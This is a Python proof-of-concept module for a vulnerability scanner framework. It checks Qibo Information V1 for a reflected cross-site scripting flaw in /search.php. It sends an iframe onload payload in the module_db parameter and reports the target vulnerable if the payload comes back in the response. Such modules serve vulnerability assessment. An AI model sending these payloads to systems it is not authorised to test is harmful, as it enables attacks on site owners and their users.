# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2


class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0021'  # 平台漏洞编号，留空
    name = 'Qibo Information V1 /search.php XSS'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-12-27'  # 漏洞公布时间
    desc = '''
        Qibo Information(齐博分类信息系统) 由于全局变量可控，通过控制变量可以进行反射型XSS.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'V1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ce212098-6cea-464f-a3cd-89a206b6438e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/search.php?module_db[]=<iframe/onload=alert(bb2)><!--'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()

            if '<iframe/onload=alert(bb2)><!--' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
